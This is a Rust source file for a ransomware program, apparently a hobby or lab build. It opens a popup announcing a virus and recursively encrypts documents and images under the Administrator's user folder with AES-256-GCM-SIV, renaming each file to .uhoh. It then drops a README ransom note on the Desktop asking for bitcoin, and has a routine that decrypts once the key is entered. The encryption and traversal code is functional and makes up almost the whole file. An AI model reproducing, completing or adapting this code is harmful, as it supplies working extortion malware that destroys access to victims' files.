#![allow(warnings)]
#[allow(dead_code)]
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::Aead;
use aes_gcm_siv::Error as AesGcmSivError;
use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
use crossterm::event::{poll, read, Event, KeyCode};
use crypto::common::typenum::U32;
use dialog::{backends::Zenity, DialogBox};
use eframe::egui;
use egui::containers;
use hex;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;
use std::f32::consts::E;
use std::ffi::OsStr;
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::path::PathBuf;
use std::process::Command;
use std::time::Duration;
use std::{fmt, fs, thread};
use std::{io, path::Path};
use walkdir::{DirEntry, Error, WalkDir};
//TODO: check the speed of this later
//TODO: gonna need to add more later,

/**
 * Use AES-256
 * Same key for all files, different nonce for each file
 *
 * Notes: nonce is to make sure 2 identical plaintexts produce different output
 * counter is to make sure 2 identical blocks within the same plaintext produce different output
 *
 * Returns: the cipher object
 */
fn main() -> Result<(), std::io::Error> {
    // create a popup on windows systems

    match Command::new("cmd")
        .arg("/C")
        .arg("start cmd /K echo hello am virus")
        .spawn()
    {
        Ok(child) => {
            println!("Child process: {:?}", child);
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    }

    let mut rng = ChaCha20Rng::from_entropy(); 
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
    let key = Aes256GcmSiv::generate_key(rng);
    let mut cipher = Aes256GcmSiv::new(&key);
    let _ = traverse(true, &mut cipher); //iterates through all the files and calls the encrypt function on each one
                                         // let test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
                                         // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
    println!("Cipher key before user input: {:?}", hex::encode(&key));
    let mut keyfile = File::create("C:\\Users\\Administrator\\Desktop\\key.txt")?;
    keyfile.write_all(&hex::encode(&key).as_bytes())?;
    writeln!(keyfile, "\n\n\nhello")?;
    drop(keyfile);

    let mut ransom_note = File::create("C:\\Users\\Administrator\\Desktop\\README.txt")?;
    writeln!(ransom_note, "hello, your files have been encrypted :)\nwhat do i do?\n* to decrypt your files, you need a key. pay me at [bitcoin address here]\n * DO NOT rename any encrypted files. if you change the extension, decryption will not work")?;
    drop(ransom_note);

    let _ = traverse(false, &mut cipher); 
    Ok(())
}

/**
 *
 * Note
 * find all the files in subdirectories.
 * follow symlinks, don't skip hidden files
 *
 * FIXME: this will probably mess up some system files, fix later
 */
fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
    //return result
    //search recursively through all directories and find files
    let test_file = File::create("C:\\Users\\Administrator\\Desktop\\output.txt");

    if !do_encrypt {
        loop {
            let mut user_input = String::new();
            // for i in (0..=20).rev() {
            //     print!("Your files will be deleted in: \r{}", i);
            //     io::stdout().flush().unwrap();
            //     thread::sleep(Duration::from_secs(1));
            // }
            // println!("\nCountdown complete!");
            
            println!("Enter decryption key pls: ");
            io::stdin().read_line(&mut user_input).unwrap();
            let user_input_str = user_input.trim(); //convert to bytes

            //key length 32, nonce length 12
            if user_input_str.len() != 64 {
                //64 because it's in hex
                //print error
                println!("Invalid key length: {}", user_input_str.len());
                //FIXME: return here
            } else {
                let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
                let decrypt_key: GenericArray<u8, U32> =
                    GenericArray::clone_from_slice(&user_input_bytes.as_slice());
                println!(
                    "Cipher key after user input: {:?}",
                    hex::encode(&decrypt_key)
                );
                //FIXME: initialize cipher here
                *cipher = Aes256GcmSiv::new(&decrypt_key);
                break;
            }
        }
    }

    let valid_extensions = vec![
        "txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls", "png", "jpg", "jpeg",
    ];

    //TODO: do NOT change the directory of this yet for safety reasons
    for entry in WalkDir::new("C:\\Users\\Administrator\\").follow_links(true) {
        match entry {
            Ok(entry) => {
                if let Some(extension) = entry.path().extension() {
                    if entry.file_type().is_file()
                        && (valid_extensions.contains(&extension.to_str().unwrap_or("")) || /*extension is .uhoh */ extension == OsStr::new("uhoh"))
                    {
                        let mut a_file = entry.path();
                        //if do_encrypt is true and the filename does not end with .uhoh
                        if do_encrypt && !a_file.to_str().unwrap().ends_with(".uhoh") {
                            let _ = encrypt(a_file, &cipher);

                            // change file extension after doing all that
                            let borked_file = format!("{}.uhoh", a_file.to_string_lossy());
                            fs::rename(a_file, borked_file);
                            //TODO: error test this
                        } else {
                            let old_filename_str = a_file.to_str().unwrap().to_string();
                            let old_filename_str = old_filename_str.replace(".uhoh", "");

                            // Convert the string back to a Path
                            let old_filename = Path::new(&old_filename_str);

                            // Rename the file
                            fs::rename(a_file, old_filename);

                            if let Some(extension) = entry.path().extension() {
                                //if
                            }

                            match decrypt(old_filename, &cipher) {
                                Ok(_) => {
                                    // let _ = writeln!(
                                    //     a_file.as_ref().unwrap(),
                                    //     "Decrypted file: {}",
                                    //     entry.path().display()
                                    // );

                                    //TODO: later:
                                }
                                Err(e) => {
                                    // let _ = writeln!(
                                    //     uhoh_file,
                                    //     "Error decrypting file: {}",
                                    //     e
                                    // );
                                    continue;
                                }
                            }
                        }
                    } else {
                        // println!("skipped file: {}", entry.path().display());
                    }
                }
            }
            Err(e) => {
                let _ = writeln!(test_file.as_ref().unwrap(), "Error: {}", e);
            }
        }
    }
    Ok(())
}

pub struct MyError {
    message: String,
}

impl From<std::io::Error> for MyError {
    fn from(err: std::io::Error) -> Self {
        Self {
            message: err.to_string(),
        }
    }
}

impl From<walkdir::Error> for MyError {
    fn from(err: walkdir::Error) -> Self {
        Self {
            message: err.to_string(),
        }
    }
}

impl From<AesGcmSivError> for MyError {
    fn from(err: AesGcmSivError) -> Self {
        Self {
            message: format!("aes_gcm_siv error: {}", err),
        }
    }
}

impl std::fmt::Display for MyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)
    }
}

/**
 * Encrypt a file, using given path and the same key for all files
 * Use different nonce for each file, prepend to file
 */
fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
    // Open a file with append option

    println!("encrypting file: {}", path.display());

    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    drop(file); //close the file (drop it)
    let mut file = File::create(path)?;
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array);
    let nonce = Nonce::from_slice(&nonce_array);
    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
    let _ = file.set_len(0);
    file.write_all(&nonce_array)?;
    let _ = file.write_all(&ciphertext.unwrap().as_slice());
    Ok(())
}

/**
 * Decrypt a file using a given key
 * this is not finished. the main decryption is in main atm
 */
fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), MyError> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let nonce = Nonce::from_slice(&buffer[0..12]);
    let ciphertext = &buffer[12..];

    println!("decrypting file: {}", path.display());
    match cipher.decrypt(nonce, ciphertext.as_ref()) {
        Ok(plaintext) => {
            drop(file);
            let mut file = File::create(path)?;
            file.set_len(0)?;
            file.write_all(&plaintext.as_slice())?;
        }
        Err(e) => {
            eprintln!("Decrypt fail: {:?}", e); 
        }
    }

    Ok(())
}
